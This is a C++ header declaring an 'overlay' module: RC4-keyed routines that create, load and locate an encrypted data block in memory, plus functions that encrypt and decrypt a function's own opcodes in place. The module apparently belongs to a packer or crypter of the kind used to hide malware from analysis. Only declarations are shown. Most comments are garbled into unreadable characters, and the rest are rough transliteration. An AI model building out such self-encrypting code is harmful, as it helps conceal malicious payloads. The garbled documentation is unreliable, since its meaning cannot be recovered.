/*
  ������� ������� ��� ����, � ������� �������� � ���.
*/
#pragma once

namespace BaseOverlay
{  
  enum
  {
    MAGIC_DWORD          = 0x45564144, //Magicheskeo Chiles (DAVE).
    FULL_SIZE_OF_OVERLAY = 512,        //Full maximum size of the overlay after the crypt.
  };
  
  /*
    �������������.
  */
  void init(void);

  /*
    ���������������.
  */
  void uninit(void);

  /*
    �������� �������.

    OUT buffer         - ����� ��� ������ �������. ������ ���� �������� �� �����
                         FULL_SIZE_OF_OVERLAY.
    IN overlay         - ����� ������������� �������.
    IN OUT overlaySize - �� ����� - ������ overlay. �� ������� - ������ ������ �������.
    IN rc4Key          - ���� ����������. ����� ���� NULL.

    Return             - true - � ������ ������,
                         false - � ������ ������.
  */
  bool _loadOverlay(void *buffer, const void *overlay, LPDWORD overlaySize, const Crypt::RC4KEY *rc4Key);
  
  /*
    �������� �������.

    OUT overlay - ����� �� �������� ����� ������� �������.
    IN data     - ������ �������.
    IN dataSize - ������ ������ �������.
    IN rc4Key   - ���� ����������. ����� ���� NULL.

    Return      - true - � ������ ������,
                  false - � ������ ������.
  */
  bool _createOverlay(void *overlay, const void *data, WORD dataSize, const Crypt::RC4KEY *rc4Key);
  
  /*
    ��������� ������ �������.

    IN mem    - ������, � ������� ����� ��������������.
    IN size   - ������ mem.
    IN rc4Key - ���� ����������. ����� ���� NULL.
    
    Return    - ����� �������, ��� NULL - � ������ ������.
  */
  void *_getAddress(const void *mem, DWORD size, const Crypt::RC4KEY *rc4Key);

  /*
    ������������ ������� �������.

    IN OUT curOpcode - ������ ������������ �����.
    IN size          - ������ ���. ������������� ����.
    IN key           - ����.
  */
  void _decryptFunction(LPBYTE curOpcode, DWORD size, DWORD key);

  /*    Encryption opcodes up to the first meeting of RET.

    IN OUT curOpcode - a starting point.
    IN key - the key.

    Return - zakriptovan number of bytes.
  */
  DWORD _encryptFunction(LPBYTE curOpcode, DWORD key);
};
